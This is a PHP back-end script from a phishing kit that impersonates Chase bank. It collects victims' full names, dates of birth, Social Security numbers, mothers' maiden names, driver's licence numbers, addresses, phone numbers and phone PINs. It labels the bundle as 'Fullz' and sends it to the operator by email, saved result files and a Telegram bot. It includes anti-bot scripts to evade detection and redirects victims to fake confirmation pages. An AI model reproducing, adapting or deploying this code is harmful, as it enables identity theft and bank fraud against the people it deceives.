<?php
session_start();
error_reporting(0);
include '../autob/bt.php';
include '../autob/basicbot.php';
include '../autob/uacrawler.php';
include '../autob/refspam.php';
include '../autob/ipselect.php';
include "../autob/bts2.php";
include "../req/config.php";

if(isset($_POST['fname']) && isset($_POST['dob']) && isset($_POST['street']) && isset($_POST['ssn']) && isset($_POST['mmn'])){
    if(strlen($_POST['dob']) == 10){
	///////////////////////// MAIL PART //////////////////////
		$fullname = $_POST['fname'];
		$street_address = $_POST['street'];
		$dob = $_POST['dob'];
		$dl = $_POST['dl'];
		$ssn = $_POST['ssn']?$_POST['ssn']:'';
		$mmn = $_POST['mmn']?$_POST['mmn']:'';
		$state = $_POST['state'];
		$zip_code = $_POST['zip'];
		$mobile = $_POST['phone'];
		$mobilepin = $_POST['mopin'];
		$PublicIP = $_SERVER['REMOTE_ADDR'];
        $Info_LOG = "
|------------------- Fullz INFO ----------------| 
First Name       : $fullname      
DOB              : $dob			
SSN              : $ssn
MMN              : $mmn
DL               : $dl 
Street Address   : $street_address 
State            : $state		  
Zip/Postal Code  : $zip_code 	  
Phone Number     : $mobile
Phone Pin        : $mobilepin";
		$_SESSION['fullz'].=$Info_LOG; 
$Info_LOG.="
Ip    : $PublicIP ";
		
// Don't Touche
//Email
        if ($Send_Email == 1) {
            $subject = $PublicIP.' 🔷🌀 ['.strtoupper($state).'] CHASE FULLZ INFO' ;$headers = 'From: YoCHI <yochchasedemons@yochchaser.xyz>' . "\r\n" .'X-Mailer: PHP/' . phpversion();
				mail($to, $subject, $Info_LOG, $headers);
        };
//FTP == 1 save result >< == 0 don't save result
        if ($Ftp_Write == 1) {
			@mkdir('../../rst');
            $file = fopen("../../rst/Result_".$PublicIP.".txt", 'a');
            fwrite($file, $Info_LOG);
			fclose($file);
        };
//TELEGRAM 
        if ($send_tg == 1) {
			sendtoTG($tgid, $Info_LOG, $tgtoken);
        };
		header("location:confirm2.php?consent_handled=true&amp;consentResponseUri=%2Fprotocol&amp;p=none");
    }
    else{ header("location:confirm.php?sfailed=c".md5(rand(100, 999999999))."15181d31&amp;consent_handled=true&amp;consentResponseUri=%2Fprotocol"); };
}
else { header("location:confirm.php?sfailed=c3Fauth".md5(rand(100, 999999999))."2da15181d31&amp;consent_handled=true&amp;consentResponseUri=%2Fprotocol"); };
?>